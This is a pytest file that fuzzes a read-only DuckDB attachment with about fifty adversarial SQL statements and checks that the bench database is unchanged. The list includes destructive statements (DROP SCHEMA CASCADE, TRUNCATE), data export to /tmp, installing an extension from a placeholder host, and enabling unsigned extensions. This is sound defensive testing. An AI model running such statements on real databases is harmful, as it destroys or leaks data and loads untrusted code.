from __future__ import annotations

import json
from pathlib import Path

import duckdb
import pytest

from _project.scripts.explorer_pipeline.pipeline import ExplorerPipeline
from tests.unit.scripts.explorer_pipeline.conftest import MINIMAL_BUNDLE

pytestmark = [pytest.mark.unit, pytest.mark.medium]


FUZZ_SQL: tuple[str, ...] = (
    "CREATE TABLE bench.evil (x INT)",
    "CREATE TABLE evil_local AS SELECT 1",
    "CREATE OR REPLACE TABLE bench.results AS SELECT 1",
    "CREATE VIEW bench.evil_view AS SELECT 1",
    "CREATE OR REPLACE VIEW bench.results AS SELECT 1",
    "CREATE SCHEMA bench.evil",
    "CREATE INDEX evil_idx ON bench.results(result_id)",
    "CREATE SEQUENCE bench.evil_seq",
    "CREATE MACRO bench.evil_macro(x) AS x + 1",
    "CREATE TEMP TABLE evil_tmp AS SELECT 1",
    "ALTER TABLE bench.results ADD COLUMN evil INT",
    "ALTER TABLE bench.results DROP COLUMN result_id",
    "ALTER TABLE bench.results RENAME TO results_evil",
    "DROP TABLE bench.results",
    "DROP VIEW IF EXISTS bench.results",
    "DROP SCHEMA bench CASCADE",
    "INSERT INTO bench.results SELECT * FROM bench.results",
    "INSERT INTO bench.results DEFAULT VALUES",
    "UPDATE bench.results SET result_id = 'x'",
    "DELETE FROM bench.results",
    "TRUNCATE bench.results",
    "MERGE INTO bench.results USING (SELECT 1 AS result_id) s ON FALSE WHEN NOT MATCHED THEN INSERT DEFAULT VALUES",
    "ATTACH 'memory.db' AS evil",
    "ATTACH ':memory:' AS evil",
    "ATTACH 'evil.duckdb' AS evil (READ_WRITE)",
    "ATTACH ':memory:' AS bench",
    "USE bench",
    "CREATE TABLE bench.main.evil_via_qual (x INT)",
    "COPY bench.results TO '/tmp/evil.parquet' (FORMAT PARQUET)",
    "COPY bench.results TO '/tmp/evil.csv' (HEADER, DELIMITER ',')",
    "COPY (SELECT 1) TO '/tmp/evil.json'",
    "EXPORT DATABASE '/tmp/evil_export'",
    "INSTALL httpfs",
    "LOAD httpfs",
    "INSTALL json",
    "LOAD parquet",
    "INSTALL 'https://example.invalid/evil.duckdb_extension'",
    "SET custom_extension_repository = 'https://example.invalid'",
    "PRAGMA enable_external_access",
    "PRAGMA disable_verification",
    "SET enable_external_access = true",
    "SET allow_unsigned_extensions = true",
    "SET file_search_path = '/tmp'",
    "SET home_directory = '/tmp'",
    "SET secret_directory = '/tmp'",
    "CREATE SECRET evil_secret (TYPE S3)",
    "CREATE OR REPLACE SECRET evil_secret (TYPE S3)",
    "DROP SECRET evil_secret",
    "BEGIN; INSERT INTO bench.results DEFAULT VALUES; COMMIT",
    "CHECKPOINT bench",
    "VACUUM bench.results",
    "CALL pragma_storage_info('bench.results')",
    "PRAGMA force_checkpoint",
)

assert len(FUZZ_SQL) >= 50, f"G-9 requires ~50 adversarial patterns, got {len(FUZZ_SQL)}"


@pytest.fixture(scope="module")
def built_db_path(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = tmp_path_factory.mktemp("fuzz")
    data_dir = root / "data"
    bundles_dir = data_dir / "bundles"
    bundles_dir.mkdir(parents=True)
    (bundles_dir / "b.json").write_text(json.dumps(MINIMAL_BUNDLE), encoding="utf-8")
    output = root / "out"
    ExplorerPipeline().run(data_dir, output)
    return output / "results.duckdb"


def _snapshot_results(con: duckdb.DuckDBPyConnection) -> list[tuple]:
    return con.execute("SELECT * FROM bench.results ORDER BY result_id").fetchall()


_MUTATION_PREFIXES = (
    "CREATE",
    "ALTER",
    "DROP",
    "INSERT",
    "UPDATE",
    "DELETE",
    "TRUNCATE",
    "MERGE",
    "ATTACH",
    "CHECKPOINT bench",
    "VACUUM bench",
    "BEGIN",
    "PRAGMA force_checkpoint",
)

BENCH_TARGETED_MUTATIONS: tuple[str, ...] = tuple(
    sql for sql in FUZZ_SQL if sql.startswith(_MUTATION_PREFIXES) and ("bench." in sql or sql.endswith(" AS bench"))
)

assert len(BENCH_TARGETED_MUTATIONS) >= 15, (
    f"expected a broad sample of bench-targeted mutations, got {len(BENCH_TARGETED_MUTATIONS)}"
)


def _attach_readonly(con: duckdb.DuckDBPyConnection, db_path: Path) -> None:
    con.execute(f"ATTACH '{db_path}' AS bench (READ_ONLY)")


class TestReadOnlyFuzz:
    def test_bench_targeted_mutations_all_fail(self, built_db_path: Path) -> None:
        with duckdb.connect(":memory:") as con:
            _attach_readonly(con, built_db_path)

            survivors: list[str] = []
            for sql in BENCH_TARGETED_MUTATIONS:
                try:
                    con.execute(sql)
                    survivors.append(sql)
                except duckdb.Error:
                    continue

            assert not survivors, "READ_ONLY attach let these bench-targeted mutations succeed:\n  " + "\n  ".join(
                survivors
            )

    def test_full_fuzz_leaves_bench_file_byte_stable(self, built_db_path: Path) -> None:
        before_mtime = built_db_path.stat().st_mtime_ns
        before_bytes = built_db_path.read_bytes()

        with duckdb.connect(":memory:") as con:
            _attach_readonly(con, built_db_path)
            for sql in FUZZ_SQL:
                try:
                    con.execute(sql)
                except duckdb.Error:
                    continue

        after_mtime = built_db_path.stat().st_mtime_ns
        after_bytes = built_db_path.read_bytes()
        assert before_mtime == after_mtime, "read-only attach allowed file mtime change"
        assert before_bytes == after_bytes, "read-only attach allowed file content change"

        with duckdb.connect(":memory:") as con:
            _attach_readonly(con, built_db_path)
            assert _snapshot_results(con), "re-attached bench.results is empty post-fuzz"

    def test_plain_select_still_works(self, built_db_path: Path) -> None:
        with duckdb.connect(":memory:") as con:
            con.execute(f"ATTACH '{built_db_path}' AS bench (READ_ONLY)")
            rows = con.execute("SELECT COUNT(*) FROM bench.results").fetchall()
            assert rows and rows[0][0] >= 1
